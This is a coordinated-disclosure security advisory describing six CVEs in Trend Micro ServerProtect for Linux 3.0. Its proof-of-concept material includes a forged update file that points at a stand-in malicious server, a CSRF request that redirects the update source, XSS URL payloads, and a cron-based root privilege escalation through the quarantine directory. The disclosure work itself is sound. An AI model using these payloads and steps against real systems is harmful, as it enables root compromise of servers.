@@ -1,0 +1,309 @@
+id: 27830
+date: 05/24/2017
+title: Trend Micro ServerProtect Disclosure / CSRF / XSS Vulnerabilities
+author: Leandro Barragan
+cves: CVE-2017-9032, CVE-2017-9033, CVE-2017-9034, CVE-2017-9035, CVE-2017-9036, CVE-2017-9037
+
+1. *Advisory Information*
+
+Title: Trend Micro ServerProtect Multiple Vulnerabilities
+Advisory ID: CORE-2017-0002
+Advisory URL:
+http://www.coresecurity.com/advisories/trend-micro-serverprotect-multiple-vulnerabilities
+Date published: 2017-05-23
+Date of last update: 2017-05-23
+Vendors contacted: Trend Micro
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: Cleartext Transmission of Sensitive Information [CWE-319],
+Insufficient Verification of Data Authenticity [CWE-345], Cross-Site
+Request Forgery [CWE-352], Improper Neutralization of Input During Web
+Page Generation ('Cross-site Scripting') [CWE-79], Improper
+Neutralization of Input During Web Page Generation ('Cross-site
+Scripting') [CWE-79], External Control of File Name or Path [CWE-73]
+Impact: Code execution, Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2017-9035, CVE-2017-9034, CVE-2017-9033, CVE-2017-9037,
+CVE-2017-9032, CVE-2017-9036
+
+3. *Vulnerability Description*
+
+Trend Micro's website states that ServerProtect for Linux 3.0 [1]  does
+"Protect against viruses, rootkits, and data-stealing malware while
+simplifying and automating security operations on servers and storage
+systems. This reliable solution from the market leader in server
+security offers real-time protection, high performance, and low
+processing overhead."
+
+Vulnerabilities were found in the ServerProtect for Linux update
+mechanism, allowing remote code execution as root. We present two
+vectors to achieve this: one via a man-in-the-middle attack and another
+one via exploiting vulnerabilities in the Web-based Management Console
+that is bundled with the product.
+
+4. *Vulnerable Packages*
+
+. Trend Micro ServerProtect for Linux 3.0-1061 with SP1 Patch 7
+(1.0-1505)
+Other products and versions might be affected, but they were not tested.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Trend Micro published the following Security Notes:
+   . KB1117411 - https://success.trendmicro.com/solution/1117411
+
+6. *Credits*
+
+These vulnerabilities were discovered and researched by Leandro Barragan
+ and Maximiliano Vidal from Core Security Consulting Services. The
+publication of this advisory was coordinated by Alberto Solino from
+Core Advisories Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+Trend Micro ServerProtect for Linux uses an insecure update mechanism
+that allows an attacker to overwrite sensitive files, including
+binaries, and achieve remote code execution as root.
+
+The vulnerabilities presented in sections 7.1 and 7.2 are the core
+issue, and would allow an attacker in a man-in-the-middle position to
+gain root access.
+
+Another option exists for when a man-in-the-middle attack is not
+feasible. The Web-based Management Console includes functionality to
+specify alternative download sources. By exploiting vulnerabilities
+7.3, 7.4, or 7.5, an attacker would be able to set an arbitrary download
+ source and trigger the vulnerable update mechanism.
+
+Also, a privilege escalation vulnerability is presented in section 7.6
+that allows a local user to run commands as root. This is achieved by
+abusing a functionality from the Web-based Management Console to set
+the quarantine directory to an arbitrary location.
+
+7.1. *Insecure Update via HTTP*
+
+[CVE-2017-9035]
+Communication to the update servers is unencrypted. The following
+request is generated when an administrator launches an update:
+
+/-----
+        GET /activeupdate/ini_xml.zip HTTP/1.1
+        Host: splx3-p.activeupdate.trendmicro.com:80
+        User-Agent: Mozilla/4.0 (compatible;MSIE 5.0; Windows 98)
+        Accept: */*
+        Pragma: No-Cache
+        Cache-Control: no-store, no-cache
+        Connection: close
+        X-Trend-ActiveUpdate: 2.85.0.1097
+
+-----/
+
+The zip contains a server.ini file that describes from where to download
+engine updates, signatures, etc., as well as some metadata of each file.
+Additional updates are also downloaded via HTTP by default.
+
+This means that the product does not do any kind of certificate
+validation or public key pinning, which makes it easier for an attacker
+to eavesdrop and tamper the data.
+
+7.2. *Unvalidated Software Updates*
+
+[CVE-2017-9034]
+Update packages are not signed or validated in any form other than
+matching the expected size described in the server.ini file.
+
+An attacker can overwrite sensitive files in the ServerProtect's
+directory, including shared libraries. Some interesting examples are
+the libvsapi.so and libaction.so files, which result in code execution
+in the context of the application, which is running as root.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+Create a zip archive with a copy of /bin/ls inside. For the example, we
+will call this file pepperoni.zip and rename the ls executable to the
+file we want to overwrite, which in this case is libvsapi.so.
+
+/-----
+    $ md5sum /bin/ls
+    c4e5f7fcbcef75924b2abde2b2e75f3f /bin/ls
+
+-----/
+
+The next step is to provide a malicious server.ini file with the
+correct size for the update:
+
+/-----
+    [Server]
+    AvailableServer=1
+    Server.1=http://malicious-server
+
+    [ENGINE]
+
+E.20000400=VSAPI_X64_LINUX,engine/pepperoni.zip,9.900.1111,57049,6.510.1002
+
+-----/
+
+The next time an update is launched, our file will be downloaded and
+the shared object library overwritten.
+
+/-----
+    $ pwd
+    /opt/TrendMicro/SProtectLinux
+    $ ls -l libvsapi.so
+    -r-x------. 1 root root 126584 mar 9 12:03 libvsapi.so
+    $ sudo md5sum libvsapi.so
+    c4e5f7fcbcef75924b2abde2b2e75f3f libvsapi.so
+
+-----/
+
+Replacing libvsapi.so with a malicious shared object file would result
+in command execution as root when the update process finishes or the
+API is accessed afterwards. Such payloads could include reverse shells,
+backdoor implants, etc.
+
+7.3. *Lack of Cross-Site Request Forgery Protection*
+
+[CVE-2017-9033]
+There are no Anti-CSRF tokens in any forms on the web interface. This
+would allow an attacker to submit authenticated requests when an
+authenticated user browses an attack-controlled domain.
+
+Proof of concept request to start an update from an arbitrary source:
+
+/-----
+    POST /SProtectLinux/scanoption_set.cgi?id=Update_Manual HTTP/1.1
+    Host: <server name>:14943
+    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0)
+Gecko/20100101 Firefox/51.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Referer: https://<server
+IP>:14943/SProtectLinux/scanoption.cgi?page=../html/Update/Update_Manual.htm
+    Cookie:
+
+!CRYPTAA!Qt/gETGgy6CFP+CHi0CZtntYcGcNf7jEzyctWQBhApzX0OfFLSEsixs9IqWTpl5joTfY06TJt9/Y2l9HXHa8EQADe8C5A9AE64ef95C270C7D8666267F8!!
+    DNT: 1
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 252
+
+
+C222=ON&C22=ON&C23=ON&C32=ON&source=V9&T119=http%3A%2F%2Frogueserver&B35=Update+now&id=ManualUpdateConfig&
+
+DoUpdateNow=1&tmLastConfigFileModifiedDate=&bOverWrite=true&bDirectlyUpdateNow=true&bLicenseViolate=&
+    UpdateSrcName=Trend+Micro+ActiveUpdate+server
+
+-----/
+
+7.4. *Cross-Site Scripting in notification.cgi*
+
+[CVE-2017-9037]
+The following parameters of the notification.cgi script are vulnerable
+to cross-site-scripting: S44, S5, S_action_fail, S_ptn_update, T113,
+T114, T115, T117117, T118, T_action_fail, T_ptn_update, textarea,
+textfield5, tmLastConfigFileModifiedDate.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+/-----
+    https://<server
+IP>:14943/SProtectLinux/notification.cgi?Scan_config3=ON&textfield5=100&D1=60&
+
+T114=[SPLX]+Security+risk+outbreak+subject&textarea=A+security+risk+outbreak+was+detected&
+
+Scan_config=ON&T115=[SPLX]+Security+risk+infection+subject&S2=Security+risk+infection(s)+detected&
+
+Scan_config4=ON&T116=[SPLX]+Real-time+scan+configuration+modified&S3=The+real-time+scan+configuration+
+
+was+modified&Scan_config5=ON&T117=[SPLX]+ServerProtect+was+started&S4=ServerProtect+was+started&
+
+Scan_config55=ON&T117117=[SPLX]+ServerProtect+was+stopped&S44=ServerProtect+was+stopped&
+
+Scan_config2=ON&T113=7&T118=[SPLX]+Pattern+file+is+outdated&S5=Pattern+file+is+outdated&
+
+CHK_ptn_update=ON&T_ptn_update=[SPLX]+Pattern+update+unsuccessful&S_ptn_update=Pattern+update+
+
+unsuccessful&CHK_action_fail=ON&T_action_fail=[SPLX]+Action+performed+on+malware+unsuccessful&
+
+S_action_fail=Action%20performed%20on%20malware%20unsuccessful%3C%2fscript%3E%3Cimg%20src%3da%20onerror%3d
+
+alert(1)%3E&B22=Save&page=Alerts.htm&action=save&tmLastConfigFileModifiedDate=123
+
+-----/
+
+7.5. *Cross-Site Scripting in log_management.cgi*
+
+[CVE-2017-9032]
+The T1 and tmLastConfigFileModifiedDate parameters of the
+log_management.cgi script are vulnerable to cross-site scripting.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+/-----
+    https://<server
+IP>:14943/SProtectLinux/log_management.cgi?T1=%2fvar%2flog%2fTrendMicro%2fSProtectLinux%3c%2f
+
+script%3e%3cimg%20src%3da%20onerror%3dalert(1)%3et&B2=Save&Type=9&sCreateDirectoryIfNotExist=&
+    goBackDoNotAsk=0&tmLastConfigFileModifiedDate=123
+
+-----/
+
+7.6. *Unrestricted quarantine directory could allow local privilege
+escalation*
+
+[CVE-2017-9036]
+The Web-based Management Console allows users to set the Quarantine
+directory to any location on the file system. An unauthenticated user
+could also change Quarantine directory settings by exploiting
+vulnerabilities 7.3, 7.4 or 7.5.
+
+Files flagged as suspicious by the scanner are then moved to that
+directory without changing its name.
+
+Quarantine files are owned by root and its permissions are changed to
+0600.
+This effectively allows a local user to write the file that is put in
+quarantine to an arbitrary location with root permissions, which could
+lead to privilege escalation.
+
+Being able to write to the file system as root opens the door to several
+ privilege escalation vectors on Linux machines. In this PoC we present
+one vector which consist on creating a cron job on /etc/cron.d
+directory:
+
+Change Quarantine directory to /etc/cron.d by visiting the following
+URL:
+
+/-----
+      https://<server
+IP>:14943/SProtectLinux/scanoption_set.cgi?T1=%2Fetc%2Fcron.d&id=QuarantineSettings&
+
+page=QuarantineDirectory&sCreateDirectoryIfNotExist=&goBackDoNotAsk=0&tmLastConfigFileModifiedDate=&
+      bOverWrite=true
+
+-----/
+
+Place the binary you want to run on /tmp/test, this could be a reverse
+shell or any other binary. Place the following file anywhere on /home:
+
+/-----
+      * * * * * root /tmp/test
+      #{{EICAR.COM string content from
+http://www.eicar.org/download/eicar.com}}
+
+-----/
+
+(Please note that we removed EICAR file content in order to avoid this
+advisory to be flagged as virus)
+
+During the next scan, that file will be flagged as a virus (it contains
+EICAR test file as part of it), and it will be written by root to the
+directory we have chosen as the Quarantine directory, effectively
+placing it on /etc/cron.d. When the cron job gets triggered, /tmp/test
+is executed as root.
+
+#  0day.today [2023-03-24]  #
